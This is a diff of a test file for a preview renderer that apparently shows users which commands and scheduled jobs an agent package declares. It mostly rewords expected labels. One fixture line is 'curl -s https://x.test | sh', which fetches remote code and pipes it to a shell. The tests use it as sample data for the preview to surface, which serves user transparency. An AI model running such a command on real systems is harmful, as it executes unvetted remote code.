@@ -41,8 +41,8 @@ describe('renderPreview', () => {
       )
     );
 
-    expect(out).toContain('Commands this package will run:');
-    expect(out).toContain('on PreToolUse (Bash)');
+    expect(out).toContain('Commands this package declares:');
+    expect(out).toContain('Runs before the agent uses a tool (Bash)');
     expect(out).toContain('curl -s https://x.test | sh');
   });
 
@@ -77,7 +77,7 @@ describe('renderPreview', () => {
       )
     );
 
-    expect(out).toContain('nightly-sweep — runs on 0 3 * * *, starts on');
+    expect(out).toContain('nightly-sweep: runs on 0 3 * * *, starts on');
     expect(out).toContain('This job can run any command without asking you.');
     expect(out).not.toContain('bypassPermissions');
   });
@@ -91,7 +91,7 @@ describe('renderPreview', () => {
       )
     );
 
-    expect(out).not.toContain('Commands this package will run:');
+    expect(out).not.toContain('Commands this package declares:');
     expect(out).not.toContain('Commands we could not read:');
     expect(out).not.toContain('Scheduled jobs:');
   });
